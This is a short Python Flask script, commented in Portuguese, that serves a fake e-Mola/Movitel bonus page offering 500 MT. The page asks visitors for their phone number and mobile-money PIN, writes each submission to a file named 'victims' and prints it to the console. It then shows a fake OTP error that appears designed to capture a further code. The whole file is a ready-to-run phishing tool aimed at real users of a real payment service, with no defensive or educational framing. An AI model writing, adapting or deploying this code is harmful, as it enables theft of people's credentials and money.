from flask import Flask, request, render_template_string

app = Flask(__name__)

# Página falsa que a vítima vai ver (Simulando erro de bónus e-Mola)
html_page = """
<!DOCTYPE html>
<html>
<head><title>Bónus e-Mola 500%</title></head>
<body style="font-family: Arial; text-align: center; background: #e6f2ff;">
    <h2 style="color: #004080;">Ativação de Bónus Movitel</h2>
    <p>Insira os dados para receber 500 MT de bónus imediato.</p>
    <form action="/login" method="post">
        <input type="text" name="phone" placeholder="Número 86/87" required><br><br>
        <input type="password" name="pin" placeholder="PIN do e-Mola" required><br><br>
        <button type="submit" style="background: #004080; color: white; padding: 10px;">RECEBER BÓNUS</button>
    </form>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html_page)

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone')
    pin = request.form.get('pin')
    
    # Guarda os dados num ficheiro de texto
    with open("vítimas.txt", "a") as f:
        f.write(f"Número: {phone} | PIN: {pin}\n")
    
    print(f"[!] DADOS RECEBIDOS -> Num: {phone} | PIN: {pin}")
    return "<h1>Erro de Sistema: O código OTP foi enviado por SMS. Insira-o na próxima página.</h1>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
